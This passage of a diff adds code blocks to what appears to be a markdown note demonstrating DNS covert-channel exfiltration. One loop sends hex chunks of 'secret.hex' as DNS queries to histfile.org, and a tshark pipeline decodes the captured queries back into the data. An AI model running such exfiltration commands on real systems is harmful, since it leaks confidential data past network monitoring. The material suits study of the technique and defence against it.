@@ -69,3 +69,22 @@ tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name \
 my secret message
 ```
 
+```bash
+for b in $(cat secret.hex); do
+  dig @histfile.org $b.covert.histfile.org
+done
+```
+
+```bash
+tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name \
+| grep "covert.histfile.org" \
+| sed 's/\.covert\.histfile\.org\.//' \
+| uniq \
+| xxd -r -p
+```
+
+```console
+first line
+second line
+third line
+```
